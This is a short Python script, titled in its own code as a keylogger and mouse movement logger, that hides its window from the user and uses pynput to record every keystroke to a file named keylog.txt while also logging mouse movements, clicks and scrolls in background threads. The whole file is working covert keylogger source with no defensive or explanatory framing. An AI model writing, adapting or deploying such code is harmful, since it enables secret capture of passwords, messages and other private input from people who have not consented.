import tkinter as tk
from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
import threading

# Create the window
window = tk.Tk()
window.title("Keylogger & Mouse Movement Logger")
window.geometry("500x400")

# Hide the window from the user's view
window.withdraw()

# Create a text widget to display the logged keys and mouse movements
log_text = tk.Text(window)
log_text.pack()

def on_key_press(key):
    # Get the key character and append it to the log_text widget
    key_char = str(key).replace("'", "")
    log_text.insert(tk.END, key_char)

    # Write the key to a log file
    with open("keylog.txt", "a") as f:
        f.write(key_char)

    # Close the keylogger when the Escape key is pressed
    if key == Key.esc or key == Key.f12 or key == Key.scroll_lock:
        window.destroy()

def on_key_release(key):
    # Handle key release events here
    pass

def on_mouse_move(x, y):
    # Log the mouse movement coordinates
    log_text.insert(tk.END, f"Mouse moved to ({x}, {y})\n")

def on_mouse_click(x, y, button, pressed):
    # Log the mouse click event
    log_text.insert(tk.END, f"Mouse clicked at ({x}, {y}) with button {button}\n")

def on_mouse_scroll(x, y, dx, dy):
    # Log the mouse scroll event
    log_text.insert(tk.END, f"Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy})\n")

def start_keylogger():
    with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

def start_mouse_logger():
    with MouseListener(on_move=on_mouse_move, on_click=on_mouse_click, on_scroll=on_mouse_scroll) as listener:
        listener.join()

# Start the keylogger and mouse logger in separate threads
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

mouselogger_thread = threading.Thread(target=start_mouse_logger)
mouselogger_thread.start()

# Run the GUI event loop to keep the program running
window.mainloop()

